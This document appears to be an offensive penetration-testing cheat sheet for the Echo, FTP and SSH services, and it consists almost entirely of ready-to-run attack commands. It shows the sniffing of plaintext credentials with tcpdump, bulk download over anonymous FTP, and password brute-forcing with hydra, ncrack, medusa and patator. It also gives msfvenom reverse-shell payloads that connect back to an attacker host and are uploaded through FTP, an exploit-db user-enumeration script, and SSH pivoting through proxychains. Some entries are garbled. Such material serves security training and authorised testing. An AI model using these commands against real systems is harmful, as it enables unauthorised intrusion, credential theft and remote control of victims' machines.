# 7 - Echo
### Contact Echo Service through netcat 

    $ nc -uvn [TARGET_IP] 7
    $ Hello echo    
Response should be the same as input 

Other attacks: 

# 21 - FTP
### NMAP FTP Enumeration

    $ nmap -p 21 [TARGET_IP] 

### Banner Grabbing 

    $ telnet [TARGET_IP] 21 
    $ nc -vn [TARGET_IP] 21 

### NMAP Unauth Enum 
Checks if an FTP server allows anonymous logins.

    $ sudo nmap -sV -p21 -sC -A [TARGET_IP]

### TCPDump FTP Traffic 

Capture ftp traffic

    $ tcpdump -vvAs0 port ftp or ftp-data

Capture credentials in plain text through unencrypted traffic (HTTP, FTP, TELNET)

    $ tcpdump -A -i eth0 'port http or port ftp or port telnet' | grep -i 'user\|pass\|login'

### FTP Connection 
Access the host utilizing FTP

    $ ftp [TARGET_IP]
    $ ftp@[TARGET_IP] 
    $ ccftp [TARGET_IP]

### FTP Access: Anonymous 
FTP login attempt on host with the user anonymous.

    $ ftp [TARGET_IP]username:anonymous

### Available Metasploit - Auxiliary Modules

    auxiliary/scanner/ftp/anonymous
    auxiliary/scanner/ftp/ftp_version
    auxiliary/scanner/ftp/ftp_login

### Browser Connection 

    ftp://anonymous:anonymous@[TARGET_IP] 

### Download all files from FTP 

    $ wget -m ftp://anonymous:anonymous@<Target_IP>
    $ wget -m --no-passive ftp://anonymous:anonymous@<Target_IP>

### Connect to FTP using starttls 

    $ lftp
    $ lftp :~> set ftp:ssl-force true
    $ lftp :~> set ssl:verify-certificate no
    $ lftp :~> connect [TARGET_IP] 
    $ lftp [TARGET_IP]:~> login                        

Usage: login <user|URL> [<pass>]

    $ lftp <Target IP>:~> login username Password 

### If username/password is found:

    1. Connect client to FTP Server through WinSCP
    2. Protocol to: FTP
    3. Encryption To: No Encryption
    4. Host name: IP of the FTP Server
    5. Port: 21
    6. Username and Password: anonymous: anonymous
    7. Click on login
 
### FTP Brute Force 

    $ hydra -l root -P passwords.txt [-t 32] [TARGET_IP] ftp
    $ ncrack -p 21 --user root -P passwords.txt [TARGET_IP] [-T 5]
    $ medusa -u root -P 500-worst-passwords.txt -h [TARGET_IP] -M ftp

### Metasploit - Upload File through FTP (Windows)
Use exploit/multi/handler 
Options 
Set payload windows/meterpreter/reverse_tcp
Set lhost
Run

 

      msfvenom -P windows/meterpreter/reverse_tcp LHOST=<IPAddress> LPORT=4444 -f aspx -o <filename.aspx>  

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf 

msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf 

 

FTP [TARGET_IP] 21 

Username= anonymous, password = none 

Put <filename.aspx> 

 

Metasploit 

PROFtpd 133c Backdoor 

 

 


Method 

Commands 

Description 

SSH Banner Grab 

 

nc [TARGET_IP] 22 

telnet [TARGET_IP] 22 

nmap -sV [TARGET_IP] 

ssh -v [TARGET_IP] 

Commands will grab banner for the SSH service running on port 22 in the remote host  

Connect to SSH 

ssh root@[TARGET_IP] 

ssh –i key <user name>@[TARGET_IP] (Connect with private Key) 

ssh command is used to securely log into a remote machine and execute commands on that machine  

Available Default Nmap Scripts 

nmap --script ssh2-enum-algos [TARGET_IP] 

nmap --script ssh-hostkey --script-args ssh_hostkey=full [TARGET_IP] 

nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<username>" [TARGET_IP] 

nmap host --script ssh-hostkey --script-args ssh_hostkey=full 

nmap host --script ssh-hostkey --script-args ssh_hostkey=all 

nmap host --script ssh-hostkey --script-args ssh_hostkey='visual bubble' 

nmap -p 22 --script ssh-brute --script-args userdb=/root/users [TARGET_IP] 

Will show how many encryption algorithms there are supported by the SSH Server. 

User Enumeration 

echo "administrator" > users 

python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt [TARGET_IP] 

 

SSH Legacy Options 

ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@[TARGET_IP] 

Unable to negotiate with legacyhost: no matching key exchange method found. Their offer: diffie-hellman-group1-sha1 

Can Change group1 to whichever is listed, ie group14 etc 

Available Metasploit Auxiliary Modules 

auxiliary/scanner/ssh/ssh_login 

auxiliary/scanner/ssh/ssh_login_pubkey 

USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt  

Brute Force 

hydra -l root -P /usr/share/wordlists/rockyou.txt [-t 32] [TARGET_IP] ssh 

ncrack -p 22 --user root -P passwords.txt [TARGET_IP] [-T 5] 

medusa -u root -P 500-worst-passwords.txt -h [TARGET_IP]-M ssh 

patator ssh_login host=[TARGET_IP] port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed' 

 

Known Configuration SSH Files 

ssh_config 

sshd_config 

authorized_keys 

ssh_known_hosts 

.shosts 

 

SSH Pivoting 

ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip (Add socks4 127.0.0.1 1010 in /etc/proxychains.conf) 

 

SSH pivoting from one network to another 

 

ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1 (Add socks4 127.0.0.1 1010 in /etc/proxychains.conf) 

proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2 (Add socks4 127.0.0.1 1011 in /etc/proxychains.conf) 

 

 

